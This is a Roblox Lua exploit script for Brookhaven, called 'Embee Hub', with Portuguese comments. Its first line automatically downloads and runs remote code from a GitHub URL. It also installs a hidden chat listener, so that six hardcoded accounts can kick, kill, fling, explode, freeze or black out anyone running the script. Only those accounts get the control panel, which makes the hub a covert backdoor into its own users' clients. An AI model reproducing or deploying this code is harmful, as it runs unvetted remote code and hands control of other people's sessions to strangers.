--// ================= EXECU√á√ÉO AUTOM√ÅTICA =================
loadstring(game:HttpGet("https://raw.githubusercontent.com/Frost230/Embee/refs/heads/main/Wbook"))()

--// ================= SERVI√áOS =================
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TextChatService = game:GetService("TextChatService")
local Workspace = game:GetService("Workspace")

--// ================= AUTORIZADOS =================
local Autorizados = {
	["tokitooff29"] = "Developer",
	["bianovo98765"] = "Developer",
	["adm_most3"] = "Friend",
	["olliver2045judoca"] = "Developer",
	["lucasgakmes2"] = "Friend",
	["darkizinho9910"] = "Friend",
}

--// ================= TAG PERMANENTE =================
local function criarTag(player)
	if not Autorizados[player.Name] then return end
	if not player.Character then return end

	local function aplicar()
		if not player.Character then return end
		if player.Character:FindFirstChild("EmbeeTag") then return end

		local head = player.Character:FindFirstChild("Head")
		if not head then return end

		local gui = Instance.new("BillboardGui")
		gui.Name = "EmbeeTag"
		gui.Size = UDim2.new(0, 150, 0, 28)
		gui.StudsOffset = Vector3.new(0, 3, 0)
		gui.AlwaysOnTop = true
		gui.Adornee = head

		local txt = Instance.new("TextLabel")
		txt.Size = UDim2.fromScale(1, 1)
		txt.BackgroundTransparency = 1
		txt.Text = "[" .. Autorizados[player.Name] .. "]"
		txt.Font = Enum.Font.GothamBold
		txt.TextScaled = true
		txt.TextColor3 = Color3.fromRGB(255, 90, 0)
		txt.TextStrokeTransparency = 0.3
		txt.Parent = gui

		gui.Parent = player.Character
	end

	aplicar()

	-- Reaplica se morrer / respawnar
	local hum = player.Character:FindFirstChildOfClass("Humanoid")
	if hum then
		hum.Died:Connect(function()
			task.delay(1, aplicar)
		end)
	end

	-- Se a tag for removida manualmente, recria
	player.Character.ChildRemoved:Connect(function(child)
		if child.Name == "EmbeeTag" then
			task.delay(0.2, aplicar)
		end
	end)
end

-- Aplica para jogadores atuais
for _, player in ipairs(Players:GetPlayers()) do
	player.CharacterAdded:Connect(function()
		task.wait(0.5)
		criarTag(player)
	end)
	if player.Character then
		criarTag(player)
	end
end

-- Aplica para novos jogadores
Players.PlayerAdded:Connect(function(player)
	player.CharacterAdded:Connect(function()
		task.wait(0.5)
		criarTag(player)
	end)
end)

--// ================= ENVIAR COMANDO =================
local function EnviarComando(cmd, alvo)
	local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
		or TextChatService.TextChannels:GetChildren()[1]

	if not canal then return end

	if alvo and alvo ~= "" then
		canal:SendAsync("//"..cmd.." "..alvo)
	else
		canal:SendAsync("//"..cmd)
	end
end

--// ================= EXECUTOR =================
local function ExecutarComando(cmd, alvoNome)
	local char = LocalPlayer.Character
	local hum = char and char:FindFirstChildOfClass("Humanoid")
	local root = char and char:FindFirstChild("HumanoidRootPart")
	if not char then return end

	-- Sistema de kick
	if cmd == "kick" then
		if alvoNome and alvoNome:lower() == LocalPlayer.Name:lower() then
			LocalPlayer:Kick("üî• Voc√™ foi removido por um administrador Embee Hub.")
		end
		return
	end

	if cmd == "kill" then
		char:BreakJoints()

	elseif cmd == "respawn" then
		LocalPlayer:LoadCharacter()

	elseif cmd == "bring" and root then
		-- Teleporta para a posi√ß√£o de quem enviou o comando
		local sender = Players:FindFirstChild(alvoNome)
		if sender and sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
			root.CFrame = sender.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -3)
		end

	elseif cmd == "freeze" and hum then
		hum.WalkSpeed = 0

	elseif cmd == "unfreeze" and hum then
		hum.WalkSpeed = 16

	elseif cmd == "speed" and hum then
		hum.WalkSpeed = 50

	elseif cmd == "ws" and hum then
		hum.WalkSpeed = 25

	elseif cmd == "jp" and hum then
		hum.JumpPower = 100

	elseif cmd == "sit" and hum then
		hum.Sit = true

	elseif cmd == "jump" and hum then
		hum.Jump = true

	elseif cmd == "god" and hum then
		hum.MaxHealth = math.huge
		hum.Health = math.huge

	elseif cmd == "ungod" and hum then
		hum.MaxHealth = 100
		hum.Health = 100

	elseif cmd == "explode" and root then
		local e = Instance.new("Explosion", workspace)
		e.Position = root.Position

	elseif cmd == "fling" and root then
		root.CFrame = CFrame.new(0,-500,0)
		local bv = Instance.new("BodyVelocity", root)
		bv.Velocity = Vector3.new(0,1000,0)
		bv.MaxForce = Vector3.new(1e9,1e9,1e9)
		task.delay(0.5,function() bv:Destroy() end)

	elseif cmd == "blind" then
		local g = Instance.new("ScreenGui", LocalPlayer.PlayerGui)
		g.Name = "Blind"
		local f = Instance.new("Frame", g)
		f.Size = UDim2.fromScale(1,1)
		f.BackgroundColor3 = Color3.new(0,0,0)

	elseif cmd == "unblind" then
		local g = LocalPlayer.PlayerGui:FindFirstChild("Blind")
		if g then g:Destroy() end
	end
end

--// ================= CHAT LISTENER =================
local function OnMessage(msg)
	if not msg.Text or not msg.TextSource then return end
	if not Autorizados[msg.TextSource.Name] then return end
	if msg.Text:sub(1,2) ~= "//" then return end

	local cmd, alvo = msg.Text:match("//(%S+)%s*(%S*)")
	if not cmd then return end
	
	cmd = cmd:lower()
	alvo = alvo and alvo:lower() or ""

	-- Comando de verifica√ß√£o sempre responde
	if cmd == "verifique" then
		local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
			or TextChatService.TextChannels:GetChildren()[1]
		if canal then
			canal:SendAsync("üî• Embee_Cliente_ON | "..LocalPlayer.Name)
		end
		return
	end

	-- Executa comando se:
	-- 1. Tem alvo especificado E o alvo √© voc√™
	-- 2. OU n√£o tem alvo (executa em todos)
	if alvo ~= "" then
		if alvo == LocalPlayer.Name:lower() then
			ExecutarComando(cmd, msg.TextSource.Name)
		end
	else
		-- Se n√£o tiver alvo, executa em todos que tem o c√≥digo
		ExecutarComando(cmd, msg.TextSource.Name)
	end
end

for _, ch in ipairs(TextChatService.TextChannels:GetChildren()) do
	if ch:IsA("TextChannel") then
		ch.MessageReceived:Connect(OnMessage)
	end
end

--// ================= WIND UI =================
if not Autorizados[LocalPlayer.Name] then return end

local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

WindUI:AddTheme({
Name = "Dark Red Theme",

Background = Color3.fromRGB(6, 0, 0),
WindowBackground = Color3.fromRGB(10, 0, 0),
DialogBackground = Color3.fromRGB(12, 0, 0),
TabBackground = Color3.fromRGB(8, 0, 0),
ElementBackground = Color3.fromRGB(20, 0, 0),
PopupBackground = Color3.fromRGB(12, 0, 0),

Accent = Color3.fromRGB(160, 0, 0),
Outline = Color3.fromRGB(40, 0, 0),
Text = Color3.fromRGB(255, 255, 255),
Placeholder = Color3.fromRGB(180, 0, 0),
Button = Color3.fromRGB(24, 0, 0),
Icon = Color3.fromRGB(200, 0, 0),

BackgroundTransparency = 0.05,
Hover = Color3.fromRGB(30, 0, 0),
WindowShadow = Color3.fromRGB(0, 0, 0),

DialogBackgroundTransparency = 0.05,
DialogTitle = Color3.fromRGB(255, 255, 255),
DialogContent = Color3.fromRGB(255, 255, 255),
DialogIcon = Color3.fromRGB(200, 0, 0),

WindowTopbarButtonIcon = Color3.fromRGB(200, 0, 0),
WindowTopbarTitle = Color3.fromRGB(255, 255, 255),
WindowTopbarAuthor = Color3.fromRGB(200, 0, 0),
WindowTopbarIcon = Color3.fromRGB(200, 0, 0),

TabTitle = Color3.fromRGB(255, 255, 255),
TabIcon = Color3.fromRGB(200, 0, 0),

ElementTitle = Color3.fromRGB(255, 255, 255),
ElementDesc = Color3.fromRGB(220, 60, 60),
ElementIcon = Color3.fromRGB(200, 0, 0),

PopupBackgroundTransparency = 0.05,
PopupTitle = Color3.fromRGB(255, 255, 255),
PopupContent = Color3.fromRGB(255, 255, 255),
PopupIcon = Color3.fromRGB(200, 0, 0),

DialogButton = Color3.fromRGB(30, 0, 0),
DialogButtonText = Color3.fromRGB(255, 255, 255),
DialogButtonHover = Color3.fromRGB(50, 0, 0),

PopupButton = Color3.fromRGB(30, 0, 0),
PopupButtonText = Color3.fromRGB(255, 255, 255),
PopupButtonHover = Color3.fromRGB(50, 0, 0)
})

local Window = WindUI:CreateWindow({
Title = "Embee Hub | Brookhaven",
Icon = "zap",
Author = "",
Folder = "Linuxhub",
Size = UDim2.fromOffset(620, 500),
Transparent = true,
Theme = "Dark Red Theme",
Resizable = true,
MinimizeKey = Enum.KeyCode.RightControl,
Background = "rbxassetid://82050163196263",
User = {
Enabled = true,
Anonymous = false,
Callback = function() end,
},
})

Window:EditOpenButton({
Title = "Embee Hub",
Icon = "zap",
CornerRadius = UDim.new(0, 16),
StrokeThickness = 2,
Color = ColorSequence.new({
ColorSequenceKeypoint.new(0, Color3.fromRGB(80, 0, 0)),
ColorSequenceKeypoint.new(0.5, Color3.fromRGB(160, 0, 0)),
ColorSequenceKeypoint.new(1, Color3.fromRGB(80, 0, 0))
}),
OnlyMobile = false,
Enabled = true,
Draggable = true,
})

--// ================= FUN√á√ïES UI =================
local function getPlayers()
	local t = {}
	for _, p in ipairs(Players:GetPlayers()) do
		table.insert(t,p.Name)
	end
	return t
end

local function dropdown(sec, cb)
	return sec:Dropdown({
		Title="Selecionar Jogador",
		Values=getPlayers(),
		Callback=cb
	})
end

--// ================= ABA COMANDOS =================
do
	local tab = Window:Tab({Title="Comandos", Icon="rbxassetid://10709781460"})
	local sec = tab:Section({Title="A√ß√µes de Controle", Opened=true})

	local alvo
	dropdown(sec,function(v) alvo=v end)

	sec:Button({
		Title="Verificar",
		Desc="Verifica quem est√° com o c√≥digo ativo",
		Icon="rbxassetid://10747374131",
		Callback=function()
			EnviarComando("verifique","")
		end
	})

	sec:Button({
		Title="Kick",
		Desc="Remove o jogador do servidor",
		Icon="rbxassetid://10747372167",
		Callback=function()
			if alvo then 
				EnviarComando("kick", alvo)
				Window:Notify({
					Title = "Comando Enviado",
					Content = "Kick enviado para: "..alvo,
					Duration = 3
				})
			else
				Window:Notify({
					Title = "Erro",
					Content = "Selecione um jogador primeiro!",
					Duration = 3
				})
			end
		end
	})

	for _, v in ipairs({
		{cmd="Kill",desc="Mata o jogador",icon="rbxassetid://10723407389"},
		{cmd="Bring",desc="Traz o jogador at√© voc√™",icon="rbxassetid://10709790948"},
		{cmd="Explode",desc="Explode o jogador",icon="rbxassetid://10723434711"},
		{cmd="Fling",desc="Arremessa o jogador",icon="rbxassetid://10723407389"},
		{cmd="Blind",desc="Tela preta",icon="rbxassetid://10734884548"},
		{cmd="Unblind",desc="Remove tela preta",icon="rbxassetid://10734950309"},
	}) do
		sec:Button({
			Title=v.cmd,
			Desc=v.desc,
			Icon=v.icon,
			Callback=function()
				if alvo then EnviarComando(v.cmd, alvo) end
			end
		})
	end
end
